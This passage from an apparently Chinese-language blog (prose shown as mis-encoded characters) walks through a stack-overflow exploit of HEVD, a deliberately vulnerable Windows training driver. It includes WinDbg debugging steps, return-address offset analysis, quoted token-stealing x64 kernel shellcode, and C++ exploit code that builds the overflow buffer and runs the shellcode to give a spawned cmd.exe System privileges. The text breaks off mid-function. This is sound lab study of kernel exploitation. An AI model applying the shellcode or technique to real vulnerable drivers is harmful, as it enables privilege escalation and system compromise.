class="function"></span>&#123;</span><br><span class="line">    HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">    hDevice = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\My1DeviceLinker&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error Create File\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> io_ctl = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">scanf_s</span>(<span class="string">&quot;%x&quot;</span>, &amp;io_ctl);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x, %x&quot;</span>, io_ctl, <span class="built_in">io2num</span>(io_ctl));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (io_ctl)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Now Excuting ...\n&quot;</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;1. [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ****** ...\n&quot;</span>;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// EXP FUNCTION HERE</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="c-ç®€å•ä¸åŠŸèƒ½äº¤äº’"><a class="markdownIt-Anchor" href="#c-ç®€å•ä¸åŠŸèƒ½äº¤äº’"></a> C. ç®€å•ä¸åŠŸèƒ½äº¤äº’</h2><p><img src="https://img.joe1sn.top/uploads/big/7a3682b00304fa6f8b1ed11bcbb9d718.png" alt="image-20240117192837142" /></p><p>è¿™é‡Œè¦ä¼ ä¸€ä¸ªç©ºé—´å’Œå¤§å°è¿‡å»ï¼Œè¿™é‡Œç”¨çš„åˆ°æ–¹å¼å°±æ˜¯ä¸Šä¸€ç¯‡çš„IOCTLæ–¹å¼</p><p>è¿™é‡Œæˆ‘æŠŠæ‰€æœ‰çš„expå®šä¹‰åœ¨<code>exp.c</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x50</span>] = <span class="string">&quot;aaaaa\0&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x30</span>;</span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl, stackspace, <span class="built_in">sizeof</span>(DWORDLONG), &amp;size, <span class="built_in">sizeof</span>(DWORDLONG), &amp;info, <span class="literal">NULL</span>);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a6c2dc60148f0770a7225e57d80fe2c7.png" alt="image-20240117195630472" /></p><p>é©±åŠ¨å®šä¹‰äº†ä¸€ä¸ª2048å¤§å°çš„æ ˆç©ºé—´<code>v5</code>ï¼Œä½†æ˜¯å†™å…¥çš„ç©ºé—´æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œå°è¯•è§¦å‘æ¼æ´</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x1000</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, size, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl, </span><br><span class="line">stackspace, size, </span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/7874f17a8d4d02206828dc53d3cab9ac.png" alt="image-20240117202959678" /></p><p><img src="https://img.joe1sn.top/uploads/big/b65a46ebcb5df65ffc94318470bfc834.png" alt="image-20240117211228964" /></p><h2 id="d-å¼€å§‹è°ƒè¯•"><a class="markdownIt-Anchor" href="#d-å¼€å§‹è°ƒè¯•"></a> D. å¼€å§‹è°ƒè¯•</h2><p>ä¹‹å‰ç¬¦å·è¡¨å¥½åƒæ²¡åŠ è½½ä¸Šï¼Œåœ¨windbgä¸­ï¼ŒHEVDçš„æè¿°ç¬¦ä¸€èˆ¬åœ¨åŒçº§æ–‡ä»¶å¤¹ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath+ &lt;pdbæ–‡ä»¶ç‰©ç†æœºä¸Šçš„è·¯å¾„&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åå†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lm m HEVD</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ec3aa1ca49a1c562e3f258276569051c.png" alt="image-20240117224344703" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /D /f HEVD!*</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/e1effb52c7e61dbd37dec5d4ae999c44.png" alt="image-20240117224429242" /></p><p>ä¸‹ä¸ªæ–­ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp HEVD!TriggerBufferOverflowStack</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿è¡Œä¸‹ä¸å´©æºƒçš„</p><p><img src="https://img.joe1sn.top/uploads/big/f006a81272655c32bcadac39d047e344.png" alt="image-20240117224828729" /></p><h3 id="i-windbg-è°ƒè¯•å¸¸ç”¨"><a class="markdownIt-Anchor" href="#i-windbg-è°ƒè¯•å¸¸ç”¨"></a> I. Windbg è°ƒè¯•å¸¸ç”¨</h3><p>åœ¨ä½¿ç”¨Windbgè°ƒè¯•å†…æ ¸é©±åŠ¨ç¨‹åºæ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å†…å­˜åœ°å€ï¼š</p><ul><li><p>64ä½æŸ¥çœ‹å†…å­˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dq &lt;å†…å­˜åœ°å€&gt; L &lt;è¦æŸ¥çœ‹çš„é•¿åº¦ï¼Œé•¿åº¦æ˜¯64ä½ä¸ºä¸€ç»„&gt;</span><br></pre></td></tr></table></figure></li><li><p>64ä½æŸ¥çœ‹å†…å­˜ï¼Œå•åˆ—æ˜¾ç¤ºï¼Œè¿™åœ¨æŸ¥çœ‹æ ˆçš„æƒ…å†µæ˜¯æ¯”è¾ƒå¥½ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dqs &lt;å†…å­˜åœ°å€&gt; L &lt;è¦æŸ¥çœ‹çš„é•¿åº¦ï¼Œé•¿åº¦æ˜¯64ä½ä¸ºä¸€ç»„&gt;</span><br></pre></td></tr></table></figure></li><li><p>åœ¨æŸå¤„æ·»åŠ æ–­ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp &lt;å†…å­˜è™šæ‹Ÿåœ°å€&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bp &lt;æ¨¡å—å&gt;!&lt;å‡½æ•°å&gt;</span><br><span class="line">//bp: break point å¦‚ bp HEVD!TriggerBufferOverflowStack</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹æ‰€æœ‰æ–­ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bl</span><br></pre></td></tr></table></figure></li><li><p>å¿«é€Ÿåæ±‡ç¼–ï¼Œé€‚åˆæŸ¥çœ‹gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u &lt;å†…å­˜åœ°å€&gt;</span><br></pre></td></tr></table></figure></li><li><p>åæ±‡ç¼–è¯¥åœ°å€å¯¹åº”çš„ä¸€æ®µæ±‡ç¼–ï¼Œé€‚åˆåæ±‡ç¼–è¿™æ®µå‡½æ•°åé€‰æ‹©æ–­ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uf &lt;å†…å­˜åœ°å€&gt;</span><br><span class="line">uf &lt;æ¨¡å—å&gt;!&lt;å‡½æ•°å&gt;</span><br></pre></td></tr></table></figure></li><li><p>è®¡ç®—å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? &lt;è®¡ç®—è¡¨è¾¾å¼&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="ii-å†…å­˜å¸ƒå±€"><a class="markdownIt-Anchor" href="#ii-å†…å­˜å¸ƒå±€"></a> II. å†…å­˜å¸ƒå±€</h3><p><img src="https://img.joe1sn.top/uploads/big/da9b01520c9211cd93d3d115e7038832.png" alt="image-20240117225628917" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x80</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, size, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl, </span><br><span class="line">stackspace, size, </span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœå¼•å‘æº¢å‡ºçš„è¯ï¼Œçœ‹çœ‹kernelä¸­çš„<code>v5</code>å˜é‡çš„å¸ƒå±€</p><p><img src="https://img.joe1sn.top/uploads/big/533fe5848e91b5a10810b49521a1b4c0.png" alt="image-20240117231239916" /></p><p><img src="https://img.joe1sn.top/uploads/big/3f6b619a89d60563919834ae5442e701.png" alt="image-20240117231345354" /></p><p>è¿™é‡Œçš„kernelBufferå°±ç›¸å½“äºç”¨æˆ·æ¨¡å¼ä¸‹çš„â€œæ ˆå¸§â€</p><p>åŒæ—¶å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç¨‹åºçš„å†…å­˜</p><p><img src="https://img.joe1sn.top/uploads/big/fcfe15fb3b2fec30ee5ef6c8baf8a314.png" alt="image-20240117235653641" /></p><p><img src="https://img.joe1sn.top/uploads/big/28848667498b38b1a820bac1838ba971.png" alt="image-20240117235638456" /></p><p>è¿™ä¸ªæ—¶å€™é¡ºä¾¿çœ‹ä¸€ä¸‹rbp</p><p><img src="https://img.joe1sn.top/uploads/big/dcdee888e276aed122855f092a922429.png" alt="image-20240117231511587" /></p><p>åœ¨<code>pop</code>å‰ä¸‹æ–­ç‚¹å†è¿è¡Œåˆ°</p><p><img src="https://img.joe1sn.top/uploads/big/1a869ecdf8003008e6c2a871f2a17c02.png" alt="image-20240117234330859" /></p><p>æ‰€ä»¥æ˜¯rsp+0x20+0x818å°±å¾—åˆ°retçš„åœ°å€</p><p>å¾ˆæ˜æ˜¾è¿™é‡Œå¯ä»¥é€šè¿‡æ ˆæº¢å‡ºåŠ«æŒè¿”å›åœ°å€ï¼Œç„¶åå®ç°æˆ‘ä»¬çš„shellcode</p><h3 id="iii-å¸ƒç½®æ„æ€"><a class="markdownIt-Anchor" href="#iii-å¸ƒç½®æ„æ€"></a> III. å¸ƒç½®æ„æ€</h3><ul><li>é¦–å…ˆ <strong>é©±åŠ¨æ˜¯64ä½</strong>ï¼Œæ‰€ä»¥è¦ç”¨64ä½çš„æ€ç»´å»å¸ƒå±€</li><li>å…¶æ¬¡ï¼Œé©±åŠ¨å’Œæˆ‘ä»¬çš„ç¨‹åºå†…å­˜ä¹‹é—´æ˜¯èƒ½è®¿é—®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨Ring3å†™shellcodeï¼Œç„¶åè¦†ç›–åˆ°Ring0å»æ‰§è¡Œ</li></ul><p>é‚£ä¹ˆå°±æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;a&quot;</span>*<span class="number">0x810</span>+p64(shellcode_addr)</span><br></pre></td></tr></table></figure><h1 id="shellcodeexpç¼–å†™"><a class="markdownIt-Anchor" href="#shellcodeexpç¼–å†™"></a> Shellcode+expç¼–å†™</h1><h2 id="a-shellcode"><a class="markdownIt-Anchor" href="#a-shellcode"></a> A. shellcode</h2><p>ä¸»è¦æ˜¯ç”¨è¿™ç¯‡ï¼š<a href="https://blog.xpnsec.com/hevd-stack-overflow/">Exploiting Windows 10 Kernel Drivers - Stack Overflow</a> æˆ–è€…é‡Œé¢å‚è€ƒçš„ä¸¤ç¯‡</p><p>ä¸»è¦ç›®çš„å°±æ˜¯æ‹¿å»Tokenç„¶åæ›¿æ¢æ‰ä¸€ä¸ªcmd.exeçš„Tokenå®ç°ææƒï¼Œ<strong>åœ¨ä¸‹ä¸€ç¯‡æ–‡ç« ä¸­ä¼šè¯¦ç»†æåˆ°</strong></p><blockquote><p>This time around we will pass the PID into the shellcode, which means that our tweaked shellcode will look like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[BITS 64]</span><br><span class="line"></span><br><span class="line">push rax</span><br><span class="line">push rbx</span><br><span class="line">push rcx</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line"></span><br><span class="line">mov rax, [gs:0x180 + 0x8]   ; Get &#x27;CurrentThread&#x27; from KPRCB</span><br><span class="line"></span><br><span class="line">mov rax, [rax + 0x220]       ; Get &#x27;Process&#x27; property from current thread</span><br><span class="line"></span><br><span class="line">next_process:</span><br><span class="line">cmp dword [rax + 0x2e0], 0x41414141  ; Search for &#x27;cmd.exe&#x27; process (&#x27;AAAA&#x27; replaced by exploit)</span><br><span class="line">je found_cmd_process</span><br><span class="line">mov rax, [rax + 0x2e8]            ; If not found, go to next process</span><br><span class="line">sub rax, 0x2e8</span><br><span class="line">jmp next_process</span><br><span class="line"></span><br><span class="line">found_cmd_process:</span><br><span class="line">mov rbx, rax                     ; Save our cmd.exe EPROCESS for later</span><br><span class="line"></span><br><span class="line">find_system_process:</span><br><span class="line">cmp dword [rax + 0x2e0], 0x00000004  ; Search for PID 4 (System process)</span><br><span class="line">je found_system_process</span><br><span class="line">mov rax, [rax + 0x2e8]</span><br><span class="line">sub rax, 0x2e8</span><br><span class="line">jmp find_system_process</span><br><span class="line"></span><br><span class="line">found_system_process:</span><br><span class="line">mov rcx, [rax + 0x358]            ; Take TOKEN from System process</span><br><span class="line">mov [rbx+0x358], rcx              ; And copy it to the cmd.exe process</span><br><span class="line"></span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">pop rcx</span><br><span class="line">pop rbx</span><br><span class="line">pop rax</span><br><span class="line"></span><br><span class="line">; return goes here</span><br></pre></td></tr></table></figure></blockquote><h2 id="b-exp"><a class="markdownIt-Anchor" href="#b-exp"></a> B. EXP</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x53</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x20</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x81</span>, <span class="number">0xb8</span>, <span class="number">0xe0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x41</span>,</span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x74</span>, <span class="number">0x0f</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x2d</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xeb</span>, <span class="number">0xe5</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line"><span class="number">0xc3</span>, <span class="number">0x83</span>, <span class="number">0xb8</span>, <span class="number">0xe0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x74</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x2d</span>, <span class="number">0xe8</span>,</span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xeb</span>, <span class="number">0xe8</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0x58</span>, <span class="number">0x03</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5f</span>,</span><br><span class="line"><span class="number">0x5e</span>, <span class="number">0x59</span>, <span class="number">0x5b</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x28</span>, <span class="number">0xc3</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD oldProtect;</span><br><span class="line">STARTUPINFOA si;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x820</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode;</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(shellcode, <span class="number">256</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line">si.cb = <span class="built_in">sizeof</span>(STARTUPINFOA);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">true</span>, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, 